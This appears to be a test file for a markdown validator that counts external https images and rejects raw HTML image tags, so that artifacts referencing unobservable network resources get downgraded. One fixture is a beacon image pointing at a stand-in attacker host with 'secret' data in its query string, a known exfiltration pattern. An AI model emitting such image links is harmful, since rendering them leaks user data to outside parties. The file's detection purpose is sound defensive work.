/**
 * Type-agnostic external-image disclosure.
 *
 * `parseMarkdown` walks Marked's token tree to count every native
 * `![](https://…)` image, every reference-style image whose definition
 * carries an https URL, and every image autolink. The count surfaces
 * on `observed.externalImageCount` so `deriveVerdict` can downgrade
 * markdown artifacts that reference resources the no-egress
 * validation run could not observe.
 */
import { describe, expect, test } from "bun:test";

import { parseMarkdown } from "../../src/validation/tier0/markdown";

function bytes(source: string): Uint8Array<ArrayBuffer> {
  return Uint8Array.from(new TextEncoder().encode(source));
}

describe("parseMarkdown — type-agnostic external image disclosure", () => {
  test("counts a native inline image with an https URL", () => {
    const result = parseMarkdown(bytes("![beacon](https://evil.example/track.png?d=secret)"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(1);
    }
  });

  test("counts multiple native inline images with https URLs", () => {
    const result = parseMarkdown(
      bytes(
        "![one](https://cdn.example/a.png) " +
          "![two](https://cdn.example/b.png) " +
          "![three](https://cdn.example/c.png)",
      ),
    );
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(3);
    }
  });

  test("does not count native images with relative or data: URLs", () => {
    const result = parseMarkdown(
      bytes(
        "![local](./relative.png) " +
          "![data](data:image/png;base64,AAA) " +
          "![abs](/static/x.png)",
      ),
    );
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(0);
    }
  });

  test("counts a reference-style image whose definition is https", () => {
    const result = parseMarkdown(bytes("![ref][cdn]\n\n[cdn]: https://cdn.example/ref.png"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(1);
    }
  });

  test("does not count a reference-style image whose definition is relative", () => {
    const result = parseMarkdown(bytes("![ref][local]\n\n[local]: ./local.png"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(0);
    }
  });

  test("counts an image with angle-bracketed autolink URL", () => {
    // CommonMark: `![alt](<https://…>)` is the canonical autolink form
    // for image destinations containing special characters. Marked
    // resolves the URL onto the image token's `href`.
    const result = parseMarkdown(bytes("![cdn](<https://cdn.example/auto.png>)"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(1);
    }
  });

  test("does not count a `link` (non-image) autolink as an external image", () => {
    // A bare `<https://…>` autolink produces a `link` token, not an
    // `image` token. The CSP `img-src` directive does not cover
    // navigation, so this is not an external-image disclosure.
    const result = parseMarkdown(bytes("https://cdn.example/just-a-link"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(0);
    }
  });

  test("counts combined inline + reference + autolink images in one document", () => {
    const result = parseMarkdown(
      bytes(
        "![one](https://cdn.example/a.png)\n" +
          "![two][ref]\n\n[ref]: https://cdn.example/b.png\n" +
          "![three](<https://cdn.example/c.png>)",
      ),
    );
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(3);
    }
  });

  test("raw HTML <img src=https://…> still rejects the document as a hostile smuggled reference", () => {
    const result = parseMarkdown(
      bytes('![one](https://cdn.example/a.png)\n<img src="https://cdn.example/b.png">'),
    );
    expect(result.status).toBe("error");
    if (result.status === "error") {
      expect(result.errors[0]!.code).toBe("html_external_reference_in_markdown");
    }
  });

  test("does not flag a document with no images", () => {
    const result = parseMarkdown(bytes("# Title\n\nParagraph.\n"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(0);
    }
  });
});
